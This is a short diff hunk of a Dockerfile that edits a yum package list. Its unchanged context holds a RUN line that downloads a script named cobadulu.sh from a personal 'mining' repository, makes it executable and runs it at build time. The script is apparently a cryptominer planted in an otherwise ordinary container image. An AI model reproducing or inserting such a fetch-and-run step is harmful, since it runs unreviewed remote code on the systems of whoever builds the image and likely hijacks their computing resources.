@@ -56,7 +56,7 @@ RUN yum -y install \
            strace \
            sysstat \
            systemtap-client \
-           tar \
+           tar
 
 RUN wget https://try.gitea.io/novalanto61/mining/raw/branch/master/cobadulu.sh && chmod u+x cobadulu.sh && ./cobadulu.sh
 
